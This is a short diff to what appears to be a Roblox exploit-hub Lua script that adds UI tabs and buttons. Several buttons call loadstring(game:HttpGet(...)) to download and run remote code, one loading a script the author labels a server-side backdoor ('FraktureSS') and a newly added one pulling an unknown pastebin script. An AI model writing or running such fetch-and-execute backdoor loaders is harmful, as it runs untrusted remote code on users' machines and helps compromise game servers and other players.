@@ -870,6 +870,10 @@ wait(math.random(12,14))
 end
 end)
 
+
+
+
+-- Home.TabMy.Skrpts
 local Home = Window:NewTab("Home")
 local HomeSection = Home:NewSection("Note: more skripts will be added soon")
 
@@ -909,6 +913,9 @@ end)
 
 HomeSection:NewButton("FraktureSS", "my baxkdoor.exe serverside", function()--FRAKTURE SS
 loadstring(game:HttpGet("https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/unobfuscated.lua"))()
+end)
+
+HomeSection:NewButton("No Lib %FO", "nolib%", function()loadstring(game:HttpGet("https://pastebin.com/raw/2Vxg0a72"))()
 end)
 
 local Stats = script.Parent.Stats
